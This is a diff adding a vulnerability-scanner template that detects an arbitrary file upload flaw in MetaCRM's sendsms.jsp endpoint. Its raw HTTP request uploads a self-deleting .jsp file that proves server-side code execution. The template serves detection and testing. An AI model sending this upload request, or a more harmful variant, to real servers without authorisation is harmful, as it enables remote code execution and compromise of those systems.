@@ -1,0 +1,33 @@
+id: metacrm-sendsms-file-upload
+
+info:
+  name: MetaCRM sendsms.jsp Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template checks for an arbitrary file upload vulnerability in MetaCRM's `sendsms.jsp` endpoint. Exploiting this allows uploading a `.jsp` file, potentially leading to remote code execution.
+  tags: file-upload, rce, metacrm
+
+http:
+  - raw:
+      - |
+        POST /business/common/sms/sendsms.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpW22
+
+        ------WebKitFormBoundary03rNBzFMIytvpW22
+        Content-Disposition: form-data; name="file"; filename="1.jsp"
+
+        <%out.println(new java.util.Random().nextInt(100));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundary03rNBzFMIytvpW22--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "java.util.Random"
+          - "delete()"
+        part: body
